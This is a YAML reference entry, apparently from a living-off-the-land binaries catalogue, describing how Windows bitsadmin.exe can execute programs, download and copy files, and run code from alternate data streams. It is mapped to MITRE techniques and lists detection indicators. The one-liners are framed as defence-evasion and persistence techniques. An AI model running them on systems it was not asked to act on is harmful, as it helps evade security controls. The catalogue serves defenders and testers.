---
name: Bitsadmin.exe
description: Used for managing background intelligent transfer
functions:
  execute:
    - description: One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.
      code: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute binary file specified. Can be used as a defensive evasion.
  download:
    - description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.
      code: bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file from Internet
  copy:
    - description: Command for copying cmd.exe to another folder
      code: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy file
  ads:
    - description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.
      code: bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.
resources:
    - resource: https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - slide 53
    - resource: https://www.youtube.com/watch?v=_8xJaaQlpBo
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
fullpath:
    - path: C:\Windows\System32\bitsadmin.exe
    - path: C:\Windows\SysWOW64\bitsadmin.exe
detection:
  - IOC: Child process from bitsadmin.exe
  - IOC: bitsadmin creates new files
  - IOC: bitsadmin adds data to alternate data stream
acknowledgement:
  - Person: Rob Fuller
    Handle: '@mubix'
  - Person: Chris Gates
    Handle: '@carnal0wnage'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
